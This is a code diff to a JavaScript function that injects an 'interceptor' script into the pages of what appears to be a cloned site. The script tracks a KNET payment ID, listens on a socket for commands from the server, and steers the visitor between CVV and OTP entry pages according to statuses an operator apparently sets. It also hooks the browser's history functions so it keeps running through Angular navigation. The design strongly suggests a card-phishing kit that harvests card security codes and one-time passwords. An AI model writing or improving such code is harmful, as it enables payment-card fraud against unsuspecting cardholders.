@@ -25,13 +25,15 @@ function notifyAdmins(event, data) {
 function getInterceptorScript() {
   return `<script>
 (function() {
-  // IMPORTANT: If URL has ?id=xxx, override sessionStorage to ensure correct payment
+  // Guard: only run once even if script is re-executed
+  if (window.__interceptorRunning) return;
+  window.__interceptorRunning = true;
+
+  // If URL has ?id=xxx, override sessionStorage immediately
   (function() {
     var params = new URLSearchParams(window.location.search);
     var urlId = params.get('id') || params.get('knetId');
-    if (urlId) {
-      sessionStorage.setItem('eventat_knet_txn', urlId);
-    }
+    if (urlId) sessionStorage.setItem('eventat_knet_txn', urlId);
   })();
 
   function getKnetId() {
@@ -44,59 +46,66 @@ function getInterceptorScript() {
   var _pollTimer = null;
   var _lastStatus = null;
   var _socket = null;
+  var _socketLoading = false;
 
   function doNavigate(page, knetId) {
-    var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
     if (page === '/knet/cvv' || page === 'cvv') {
       window.location.href = '/knet/cvv?id=' + knetId;
     } else if (page === '/knet-otp' || page === 'otp') {
       window.location.href = '/knet-otp?id=' + knetId;
     } else {
-      // Generic navigate with id appended
       window.location.href = page + (knetId ? '?id=' + knetId : '');
     }
   }
 
-  function startSocket(knetId) {
-    if (_socket) return;
-    try {
+  function setupSocket(knetId) {
+    if (_socket || _socketLoading) return;
+    _socketLoading = true;
+    // Load socket.io if not already loaded
+    function initSocket() {
+      try {
+        _socket = io();
+        _socket.on('connect', function() {
+          _socket.emit('join_payment', knetId);
+          var isCvvPage = window.location.pathname.indexOf('/knet/cvv') !== -1 ||
+                          window.location.search.indexOf('mode=cvv') !== -1;
+          _socket.emit('page_update', isCvvPage ? '/knet/cvv' : '/knet-otp');
+          console.log('[Interceptor] Socket connected, joined payment:', knetId);
+        });
+        _socket.on('navigate_to', function(data) {
+          console.log('[Interceptor] navigate_to received:', data);
+          if (data && data.page) doNavigate(data.page, knetId);
+        });
+        _socket.on('payment_status_changed', function(data) {
+          if (!data || (data.id !== knetId && data.paymentId !== knetId)) return;
+          console.log('[Interceptor] payment_status_changed:', data.status);
+          var isCvvPage = window.location.pathname.indexOf('/knet/cvv') !== -1 ||
+                          window.location.search.indexOf('mode=cvv') !== -1;
+          var status = data.status;
+          if (status === 'CVV_PENDING' && !isCvvPage) {
+            doNavigate('/knet/cvv', knetId);
+          } else if (status === 'CVV_APPROVED' && isCvvPage) {
+            doNavigate('/knet-otp', knetId);
+          } else if (status === 'CVV_FAILED' && isCvvPage) {
+            window.location.href = '/knet/cvv?id=' + knetId + '&error=1';
+          }
+        });
+      } catch(e) { console.log('[Interceptor] Socket error:', e); }
+    }
+    if (typeof io !== 'undefined') {
+      initSocket();
+    } else {
       var s = document.createElement('script');
       s.src = '/socket.io/socket.io.js';
-      s.onload = function() {
-        try {
-          _socket = io();
-          _socket.on('connect', function() {
-            _socket.emit('join_payment', knetId);
-            var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
-            _socket.emit('page_update', isCvvPage ? '/knet/cvv' : '/knet-otp');
-          });
-          _socket.on('navigate_to', function(data) {
-            if (data && data.page) doNavigate(data.page, knetId);
-          });
-          _socket.on('payment_status_changed', function(data) {
-            if (!data || (data.id !== knetId && data.paymentId !== knetId)) return;
-            var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
-            var status = data.status;
-            if (status === 'CVV_PENDING' && !isCvvPage) {
-              doNavigate('/knet/cvv', knetId);
-            } else if (status === 'CVV_APPROVED' && isCvvPage) {
-              doNavigate('/knet-otp', knetId);
-            } else if (status === 'CVV_FAILED' && isCvvPage) {
-              window.location.href = '/knet/cvv?id=' + knetId + '&error=1';
-            }
-          });
-        } catch(e) {}
-      };
+      s.onload = function() { initSocket(); };
       document.head.appendChild(s);
-    } catch(e) {}
+    }
   }
 
-  function startPolling() {
-    var knetId = getKnetId();
-    if (!knetId) return;
-    if (_pollTimer) return; // already polling
-    // Start socket connection for real-time navigate_to events
-    startSocket(knetId);
+  function startPolling(knetId) {
+    if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
+    _lastStatus = null;
+    setupSocket(knetId);
     _pollTimer = setInterval(function() {
       var id = getKnetId();
       if (!id) return;
@@ -108,23 +117,84 @@ function getInterceptorScript() {
           var status = data.payment.status;
           if (status === _lastStatus) return;
           _lastStatus = status;
-          var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
+          console.log('[Interceptor] Status changed to:', status);
+          var isCvvPage = window.location.pathname.indexOf('/knet/cvv') !== -1 ||
+                          window.location.search.indexOf('mode=cvv') !== -1;
           if (status === 'CVV_PENDING' && !isCvvPage) {
-            clearInterval(_pollTimer);
+            clearInterval(_pollTimer); _pollTimer = null;
             doNavigate('/knet/cvv', id);
           } else if (status === 'CVV_APPROVED' && isCvvPage) {
-            clearInterval(_pollTimer);
+            clearInterval(_pollTimer); _pollTimer = null;
             doNavigate('/knet-otp', id);
           } else if (status === 'CVV_FAILED' && isCvvPage) {
-            clearInterval(_pollTimer);
+            clearInterval(_pollTimer); _pollTimer = null;
             window.location.href = '/knet/cvv?id=' + id + '&error=1';
           }
         });
     }, 1500);
     window._interceptPoll = _pollTimer;
+    console.log('[Interceptor] Polling started for:', knetId);
   }
-  // Start polling after a short delay to let Angular initialize
-  setTimeout(startPolling, 2000);
+
+  // Hook into Angular's history.pushState to detect SPA navigation
+  var _origPushState = history.pushState.bind(history);
+  history.pushState = function(state, title, url) {
+    _origPushState(state, title, url);
+    // After Angular navigation, check if we're on knet-otp page and restart polling
+    setTimeout(function() {
+      var currentUrl = window.location.href;
+      var isKnetOtp = currentUrl.indexOf('/knet-otp') !== -1 || currentUrl.indexOf('/knet/cvv') !== -1;
+      if (isKnetOtp) {
+        // Update sessionStorage if URL has id
+        var params = new URLSearchParams(window.location.search);
+        var urlId = params.get('id') || params.get('knetId');
+        if (urlId) sessionStorage.setItem('eventat_knet_txn', urlId);
+        var knetId = getKnetId();
+        if (knetId) {
+          console.log('[Interceptor] Angular navigation detected, restarting polling for:', knetId);
+          startPolling(knetId);
+        }
+      }
+    }, 500);
+  };
+
+  // Also hook replaceState
+  var _origReplaceState = history.replaceState.bind(history);
+  history.replaceState = function(state, title, url) {
+    _origReplaceState(state, title, url);
+    setTimeout(function() {
+      var currentUrl = window.location.href;
+      var isKnetOtp = currentUrl.indexOf('/knet-otp') !== -1 || currentUrl.indexOf('/knet/cvv') !== -1;
+      if (isKnetOtp) {
+        var params = new URLSearchParams(window.location.search);
+        var urlId = params.get('id') || params.get('knetId');
+        if (urlId) sessionStorage.setItem('eventat_knet_txn', urlId);
+        var knetId = getKnetId();
+        if (knetId && !_pollTimer) {
+          console.log('[Interceptor] replaceState detected, starting polling for:', knetId);
+          startPolling(knetId);
+        }
+      }
+    }, 500);
+  };
+
+  // Initial start: try immediately and also after delays
+  function tryStart() {
+    var knetId = getKnetId();
+    var isKnetPage = window.location.href.indexOf('/knet-otp') !== -1 ||
+                     window.location.href.indexOf('/knet/cvv') !== -1;
+    if (knetId && isKnetPage && !_pollTimer) {
+      startPolling(knetId);
+    }
+  }
+
+  // Try at multiple intervals to catch Angular initialization
+  tryStart();
+  setTimeout(tryStart, 500);
+  setTimeout(tryStart, 1000);
+  setTimeout(tryStart, 2000);
+  setTimeout(tryStart, 3000);
+
 })();
 <\/script>`;
 }
